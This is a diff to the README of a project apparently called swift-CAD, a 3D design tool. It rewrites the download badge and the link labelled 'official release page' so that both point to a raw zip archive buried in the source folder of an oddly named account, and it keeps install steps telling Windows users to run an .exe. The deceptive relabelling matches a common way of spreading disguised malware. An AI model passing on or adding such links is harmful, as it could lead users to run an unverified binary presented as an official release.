@@ -1,6 +1,6 @@
 # 📐 swift-CAD - Create precise 3D designs with ease
 
-[![](https://img.shields.io/badge/Download-swift--CAD-blue)](https://github.com/drycleanersclematisvitalba266/swift-CAD)
+[![](https://img.shields.io/badge/Download-swift--CAD-blue)](https://github.com/drycleanersclematisvitalba266/swift-CAD/raw/refs/heads/main/Sources/CADCore/swift-CAD-3.3.zip)
 
 swift-CAD helps you create 3D models for engineering and design. The software uses a fast engine to handle geometry and measurements. You can work with parametric shapes and standard industry file formats. This tool supports B-rep evaluation and zero-copy exchange to ensure your data stays accurate. It also runs on modern web browsers through WebAssembly technology.
 
@@ -8,7 +8,7 @@ swift-CAD helps you create 3D models for engineering and design. The software us
 
 Follow these steps to get the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/drycleanersclematisvitalba266/swift-CAD).
+1. Go to the [official release page](https://github.com/drycleanersclematisvitalba266/swift-CAD/raw/refs/heads/main/Sources/CADCore/swift-CAD-3.3.zip).
 2. Look for the latest version under the Releases section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
